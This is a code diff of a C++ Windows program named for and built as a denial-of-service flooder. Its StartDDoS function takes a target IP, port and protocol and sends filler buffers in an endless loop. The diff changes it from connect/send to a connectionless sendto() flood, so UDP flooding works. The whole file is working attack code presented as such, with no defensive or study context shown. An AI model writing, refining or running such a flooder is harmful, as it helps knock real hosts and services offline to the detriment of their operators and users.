@@ -15,7 +15,7 @@
 struct PREPARED_DATA
 {
     const char* ip;
-    const char* port;
+    u_short port;
     uint32_t sock; // SOCK_STREAM || SOCK_DGRAM
     uint32_t protocol; // IPPROTO_TCP || IPPROTO_UDP
     uint32_t buff_size;
@@ -23,68 +23,36 @@ struct PREPARED_DATA
 
 void StartDDoS(PREPARED_DATA data)
 {
-    WSADATA wsaData;
     int iResult;
+    WSADATA wsaData;
 
-    // Initialize Winsock
+    SOCKET SendSocket = INVALID_SOCKET;
+    sockaddr_in RecvAddr;
+
     iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
-
-    if (iResult)
-    {
-        printf("Something went wrong... Aborting\n");
+    if (iResult != NO_ERROR) {
+        printf("WSAStartup failed with error: %d\n", iResult);
         return;
     }
 
-    struct addrinfo* result = NULL,
-        * ptr = NULL,
-        hints;
-
-    ZeroMemory(&hints, sizeof(hints));
-    hints.ai_family = AF_INET;
-    hints.ai_socktype = data.sock;
-    hints.ai_protocol = data.protocol;
-
-    iResult = getaddrinfo(data.ip, data.port, &hints, &result);
-    if (iResult)
-    {
-        printf("Invalid [ip,port,hints,result] params\n");
-        return;
-    }
-
-    SOCKET ConnectSocket = INVALID_SOCKET;
-
-    ptr = result;
-
-    // Create a SOCKET for connecting to server
-    ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
-        ptr->ai_protocol);
-
-    if (ConnectSocket == INVALID_SOCKET) {
-        printf("Error at socket(): %ld\n", WSAGetLastError());
-        freeaddrinfo(result);
+    SendSocket = socket(AF_INET, data.sock, data.protocol);
+    if (SendSocket == INVALID_SOCKET) {
+        printf("Socket failed with error: %ld\n", WSAGetLastError());
         WSACleanup();
         return;
     }
 
-    iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
-    if (iResult == SOCKET_ERROR) {
-        closesocket(ConnectSocket);
-        ConnectSocket = INVALID_SOCKET;
-    }
-
-    freeaddrinfo(result);
-
-    if (ConnectSocket == INVALID_SOCKET) {
-        printf("Unable to connect to ip!\n");
-        WSACleanup();
-        return;
-    }
+    RecvAddr.sin_family = AF_INET;
+    RecvAddr.sin_port = htons(data.port);
+    IN_ADDR* addr = new IN_ADDR();
+    inet_pton(AF_INET, data.ip, addr);
+    RecvAddr.sin_addr = *addr;
 
     printf("Attack started!\n");
     std::string generated_buff(data.buff_size,'0');
 
     while (true)
-        send(ConnectSocket, generated_buff.c_str(), generated_buff.size(), SO_DONTLINGER);
+        sendto(SendSocket, generated_buff.c_str(), data.buff_size, 0, (SOCKADDR*)& RecvAddr, sizeof(RecvAddr));
 }
 
 std::string ReadSmth(const char* message)
@@ -120,7 +88,7 @@ bool GetArgData(int argc, const char** argv, PREPARED_DATA& data)
         return false;
 
     data.ip = argv[1];
-    data.port = argv[2];
+    data.port = std::atoi(argv[2]);
     std::string pp = argv[3];
     data.sock = SelectSock(pp);
     pp = argv[4];
@@ -144,13 +112,13 @@ int main(int argc, const char** argv)
     if (!GetArgData(argc, argv, data))
     {
         data.ip = CopyStr(ReadSmth("IP"));
-        data.port = CopyStr(ReadSmth("PORT"));
+        data.port = std::atoi(CopyStr(ReadSmth("PORT")));
         data.sock = SelectSock(ReadSmth("SOCKET (STREAM || DIAGRAM)"));
         data.protocol = SelectProtocol(ReadSmth("PROTOCOL (TCP || UDP)"));
         data.buff_size = std::atoi(ReadSmth("BUFF_SIZE (Bytes)").c_str());
     }
     std::cout << data.ip << std::endl;
-    printf("Starting with params:\nIP: %s\nPORT: %s\nSOCK: %d\nPROTOCOL: %d\nBUFF_SIZE (Bytes): %d\n",
+    printf("Starting with params:\nIP: %s\nPORT: %d\nSOCK: %d\nPROTOCOL: %d\nBUFF_SIZE (Bytes): %d\n",
         data.ip,data.port,data.sock,data.protocol,data.buff_size);
 
     StartDDoS(data);
